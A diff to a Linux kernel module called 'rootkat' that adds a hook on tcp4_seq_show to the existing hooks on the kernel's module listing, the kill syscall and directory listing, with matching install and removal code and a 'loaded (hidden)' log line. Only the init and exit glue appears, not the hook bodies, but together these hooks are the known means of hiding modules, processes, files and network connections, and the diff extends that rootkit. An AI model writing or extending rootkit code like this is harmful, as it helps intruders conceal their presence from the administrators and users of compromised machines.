@@ -7,6 +7,7 @@
 #include "hook_m_show.h"
 #include "hook_sys_kill.h"
 #include "hook_filldir64.h"
+#include "hook_tcp4_seq_show.h"
 
 #define ROOTKAT_TAG "rootkat: "
 
@@ -43,12 +44,22 @@ static int __init rootkat_init(void)
 		return rc;
 	}
 
+	rc = rootkat_hook_tcp4_seq_show_install();
+	if (rc) {
+		pr_err(ROOTKAT_TAG "tcp4_seq_show hook failed: %d\n", rc);
+		rootkat_hook_filldir64_remove();
+		rootkat_hook_sys_kill_remove();
+		rootkat_hook_m_show_remove();
+		return rc;
+	}
+
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_tcp4_seq_show_remove();
 	rootkat_hook_filldir64_remove();
 	rootkat_hook_sys_kill_remove();
 	rootkat_hook_m_show_remove();
